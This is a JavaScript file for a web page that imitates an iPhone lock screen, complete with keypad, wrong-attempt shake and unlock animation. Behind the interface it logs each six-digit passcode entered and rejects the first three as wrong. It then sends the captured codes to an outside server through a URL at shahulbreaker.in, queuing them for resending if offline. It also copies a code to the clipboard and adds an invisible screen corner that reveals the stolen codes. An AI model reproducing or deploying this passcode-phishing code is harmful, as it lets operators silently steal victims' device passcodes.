// ---- Storage API: request persistent storage (best effort; HTTPS required) ----
(async () => {
  if (navigator.storage && navigator.storage.persist) {
    try {
      if (navigator.storage.persisted) {
        try {
          const already = await navigator.storage.persisted();
          console.debug('Storage persisted already:', already);
        } catch (e) {}
      }
      const granted = await navigator.storage.persist();
      console.debug('Persistent storage requested:', granted);
    } catch (e) {
      console.warn('Storage persist request failed', e);
    }
  }
})();

// ---- Service Worker registration with immediate activation/update (optional) ----
(function registerServiceWorker() {
  if (!('serviceWorker' in navigator)) return;
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('service-worker.js')
      .then((reg) => {
        if (reg.waiting) {
          try { reg.waiting.postMessage({ type: 'SKIP_WAITING' }); } catch (e) {}
        }
        reg.addEventListener('updatefound', () => {
          const sw = reg.installing;
          if (!sw) return;
          sw.addEventListener('statechange', () => {
            if (sw.state === 'installed' && navigator.serviceWorker.controller) {
              try { sw.postMessage({ type: 'SKIP_WAITING' }); } catch (e) {}
            }
          });
        });
      })
      .catch((err) => console.warn('SW registration failed', err));
    navigator.serviceWorker.addEventListener('controllerchange', () => {
      if (!window.__reloadedBySW) {
        window.__reloadedBySW = true;
        window.location.reload();
      }
    });
  });
})();

// ---- Main app logic ----
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
  const MAX = 6;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  let cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const dynamicIslandEl = document.querySelector('.dynamic-island');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';
  const LAST_CODES_KEY = '_pass_last_codes_';

  (function ensureWallpaperPaints() {
    try {
      const wp = document.getElementById('wallpaperImg');
      if (wp) {
        wp.addEventListener('error', () => {
          wp.style.display = 'none';
        });
        if (wp.decode) {
          wp.decode().catch(() => { /* ignore */ });
        }
      }
    } catch (e) {}
  })();

  (function setupViewportSync() {
    function updateViewportHeight() {
      try {
        const vv = window.visualViewport;
        const base = vv ? Math.round(vv.height) : window.innerHeight;
        const overfill = 8;
        const used = Math.max(100, base + overfill);
        document.documentElement.style.setProperty('--app-viewport-height', used + 'px');
        const ls = document.querySelector('.lockscreen');
        if (ls) ls.style.height = used + 'px';
        document.body.style.height = used + 'px';
      } catch (err) {
        console.warn('viewport sync failed', err);
      }
    }
    window.addEventListener('load', updateViewportHeight, { passive: true });
    if (window.visualViewport) {
      window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
      window.visualViewport.addEventListener('scroll', updateViewportHeight, { passive: true });
    }
    window.addEventListener('resize', updateViewportHeight, { passive: true });
    window.addEventListener('orientationchange', updateViewportHeight, { passive: true });
    updateViewportHeight();
    let t = 0;
    const id = setInterval(() => {
      updateViewportHeight();
      t += 1;
      if (t > 20) clearInterval(id);
    }, 120);
  })();

  function getLastCodes() {
    try {
      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
    } catch (e) {
      return [];
    }
  }
  function pushLastCode(c) {
    try {
      const arr = getLastCodes();
      arr.push(c);
      while (arr.length > MAX) arr.shift();
      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
    } catch (e) {}
  }
  function getCombinedLastCodes() {
    return getLastCodes().join(',');
  }

  function clearSavedAttempts() {
    try {
      localStorage.removeItem(LAST_CODES_KEY);
      localStorage.removeItem(ATT_KEY);
      localStorage.removeItem(QUEUE_KEY);
    } catch (e) { /* ignore */ }
  }
  (function ensureFreshSessionOnLaunch() {
    try {
      const alreadyStarted = sessionStorage.getItem('pass_session_started');
      function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
      if (!alreadyStarted) {
        clearSavedAttempts();
        markStarted();
      }
      window.addEventListener('pageshow', () => {
        if (!sessionStorage.getItem('pass_session_started')) {
          clearSavedAttempts();
          markStarted();
        }
      }, { passive: true });
    } catch (err) {
      console.warn('session init check failed', err);
    }
  })();

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    const dots = Array.from(document.querySelectorAll('.dot'));
    dots.forEach((d, i) => d.classList.toggle('filled', i < code.length));
    updateCancelText();
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(() => { });
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  // ---------- Spring integrator ----------
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120;
    const damping = opts.damping ?? 14;
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;
    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;
      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);
      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }
    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  // ---------- iPhone unlock animation ----------
 function playUnlockAnimation() {
  const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (!lockInner || !unlockOverlay || !homescreenImg) return;

  unlockOverlay.classList.add('show');
  lockInner.classList.add('animating');
  homescreenImg.style.transition = 'none';
  homescreenImg.style.transform = 'scale(1.10)';
  homescreenImg.style.filter = 'blur(20px) saturate(0.8)';
  homescreenImg.style.opacity = '1';

  if (prefersReduced) {
    lockInner.style.transition = 'none';
    lockInner.style.transform = `translateY(-110%)`;
    homescreenImg.style.transition = 'none';
    homescreenImg.style.transform = `scale(1)`;
    homescreenImg.style.filter = 'blur(0) saturate(1)';
    return;
  }

  // --- Step 1: Animate lockscreen-inner up & fade out (over 950ms, cubic-bezier like iOS)
  lockInner.style.transition = 'transform 0.95s cubic-bezier(.26,1,.48,1), opacity 0.88s cubic-bezier(.26,1,.48,1)';
  lockInner.style.transform = `translateY(-100vh)`;
  lockInner.style.opacity = '0.01';

  // --- Step 2: Home animates from scale(1.10) blur(20px) to scale(1.0), blur(0), with a springy bounce at the end
  setTimeout(() => {
    homescreenImg.style.transition = 'transform 1.34s cubic-bezier(.31,1.31,.58,.99), filter 1s cubic-bezier(.4,1,.6,1)';
    homescreenImg.style.transform = 'scale(1)';
    homescreenImg.style.filter = 'blur(0) saturate(1)';
  }, 25);

  // --- Clean up: clear transitions so future unlocks work seamlessly
  setTimeout(() => {
    lockInner.classList.remove('animating');
    lockInner.style.transition = '';
    homescreenImg.style.transition = '';
    lockInner.style.transform = '';
    lockInner.style.opacity = '';
    unlockOverlay.classList.remove('show');
  }, 1500);

  // Optional: hide dynamic island with a fade
  if (dynamicIslandEl) {
    setTimeout(() => {
      dynamicIslandEl.classList.add('shrinking');
      dynamicIslandEl.addEventListener('transitionend', function handler(ev) {
        if (ev.target !== dynamicIslandEl) return;
        dynamicIslandEl.removeEventListener('transitionend', handler);
        dynamicIslandEl.style.display = 'none';
        dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
      });
      setTimeout(() => {
        dynamicIslandEl.style.display = 'none';
        dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
      }, 1200);
    }, 900);
  }
}


  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    if (cancelBtn) cancelBtn.textContent = 'Cancel';
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(text).catch(() => {
        return fallbackCopy(text);
      });
    }
    return Promise.resolve().then(() => fallbackCopy(text));
  }
  function fallbackCopy(text) {
    return new Promise((resolve, reject) => {
      try {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        ta.style.top = '0';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        const ok = document.execCommand('copy');
        document.body.removeChild(ta);
        if (ok) resolve();
        else reject(new Error('execCommand copy failed'));
      } catch (err) {
        reject(err);
      }
    });
  }

  function showToast(msg, ms = 1200) {
    let t = document.getElementById('pass-toast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'pass-toast';
      document.body.appendChild(t);
      if (!getComputedStyle(t).position) {
        Object.assign(t.style, {
          position: 'fixed',
          left: '50%',
          bottom: '120px',
          transform: 'translateX(-50%)',
          background: 'rgba(0,0,0,0.75)',
          color: '#fff',
          padding: '8px 12px',
          borderRadius: '10px',
          zIndex: '12002',
          pointerEvents: 'none',
          opacity: '0',
          transition: 'opacity 160ms ease, transform 160ms ease'
        });
      }
    }
    t.textContent = msg;
    t.style.opacity = '1';
    t.style.transform = 'translateX(-50%) translateY(0)';
    clearTimeout(t._hideTimer);
    t._hideTimer = setTimeout(() => {
      t.style.opacity = '0';
      t._hideTimer2 = setTimeout(() => { }, 200);
    }, ms);
  }

  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);
    pushLastCode(enteredCode);

    if (attempts === 1 || attempts === 2) {
      animateWrongAttempt();
    } else if (attempts === 3) {
      const combined = getCombinedLastCodes();
      if (combined) sendToAPI(combined);
      animateWrongAttempt();
    } else if (attempts === 4) {
      if (dynamicIslandEl) {
        dynamicIslandEl.classList.remove('locked');
        dynamicIslandEl.classList.add('unlocked', 'icon-opened');
        requestAnimationFrame(() => {
          playUnlockAnimation();
        });
      } else {
        playUnlockAnimation();
      }
      setTimeout(reset, 300);
    }
    if (attempts >= 4) setAttempts(0);
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;
    function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) requestAnimationFrame(frame);
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;
    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
      updateCancelText();
    }, { passive: true });
    const endPress = () => { animateBrightness(k, 1, 100); };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();
      if (code.length === MAX) {
        const enteredCode = code;
        try {
          const upcomingAttempts = getAttempts() + 1;
          if (upcomingAttempts === 3) {
            const toCopy = enteredCode;
            copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
          }
        } catch (err) {
          console.warn('clipboard pre-copy failed', err);
        }
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());

  function updateCancelText() {
    cancelBtn = document.getElementById('cancel') || cancelBtn;
    if (!cancelBtn) return;
    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
  }

  function wireCancelAsDelete() {
    const old = document.getElementById('cancel');
    if (!old) return;
    const cloned = old.cloneNode(true);
    old.parentNode && old.parentNode.replaceChild(cloned, old);
    cancelBtn = document.getElementById('cancel');
    cancelBtn.addEventListener('click', (e) => {
      e.preventDefault();
      if (code.length > 0) {
        code = code.slice(0, -1);
        refreshDots();
        updateCancelText();
      } else {
        reset();
      }
    });
  }

  wireCancelAsDelete();
  updateCancelText();

  window.addEventListener('online', flushQueue);
  flushQueue();

  // Invisible hotspot for codes
  function createInvisibleHotspotAndDisplay() {
    if (!document.getElementById('codesHotspot')) {
      const hs = document.createElement('div');
      hs.id = 'codesHotspot';
      Object.assign(hs.style, {
        position: 'fixed',
        left: '8px',
        bottom: '8px',
        width: '56px',
        height: '56px',
        borderRadius: '12px',
        background: 'transparent',
        border: 'none',
        zIndex: '12000',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        boxSizing: 'border-box',
        touchAction: 'manipulation',
        cursor: 'pointer',
        pointerEvents: 'auto'
      });
      document.body.appendChild(hs);
    }
    if (!document.getElementById('codesCombinedDisplay')) {
      const d = document.createElement('div');
      d.id = 'codesCombinedDisplay';
      Object.assign(d.style, {
        position: 'fixed',
        left: '8px',
        bottom: '72px',
        minWidth: '160px',
        maxWidth: 'calc(100% - 16px)',
        zIndex: '12001',
        display: 'none',
        justifyContent: 'center',
        pointerEvents: 'none',
        transition: 'opacity 120ms ease, transform 120ms ease'
      });
      const inner = document.createElement('div');
      inner.id = 'codesCombinedInner';
      Object.assign(inner.style, {
        width: '100%',
        background: 'rgba(0,0,0,0.7)',
        borderRadius: '12px',
        padding: '10px 12px',
        boxSizing: 'border-box',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#fff',
        fontSize: '16px',
        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
        fontWeight: '700',
        letterSpacing: '0.6px'
      });
      d.appendChild(inner);
      document.body.appendChild(d);
    }
  }
  function showCombinedStringAtBottomLeft() {
    createInvisibleHotspotAndDisplay();
    const bar = document.getElementById('codesCombinedDisplay');
    const inner = document.getElementById('codesCombinedInner');
    inner.textContent = '';
    const codes = getLastCodes();
    if (!codes || codes.length === 0) inner.textContent = '';
    else inner.textContent = codes.join(',');
    bar.style.display = 'flex';
    requestAnimationFrame(() => {
      bar.style.transform = 'translateY(0)';
      bar.style.opacity = '1';
    });
  }
  function hideCombinedDisplayNow() {
    const bar = document.getElementById('codesCombinedDisplay');
    if (!bar) return;
    bar.style.transform = 'translateY(8px)';
    bar.style.opacity = '0';
    setTimeout(() => {
      if (bar) bar.style.display = 'none';
    }, 140);
  }
  function onHotspotDown(ev) {
    ev.preventDefault();
    showCombinedStringAtBottomLeft();
  }
  function onHotspotUp(ev) {
    hideCombinedDisplayNow();
  }
  function ensureHotspotListeners() {
    createInvisibleHotspotAndDisplay();
    const hs = document.getElementById('codesHotspot');
    if (!hs._attached) {
      hs.addEventListener('pointerdown', onHotspotDown);
      window.addEventListener('pointerup', onHotspotUp);
      window.addEventListener('pointercancel', onHotspotUp);
      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
      window.addEventListener('touchend', onHotspotUp);
      window.addEventListener('touchcancel', onHotspotUp);
      hs._attached = true;
    }
  }
  ensureHotspotListeners();
  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
})();

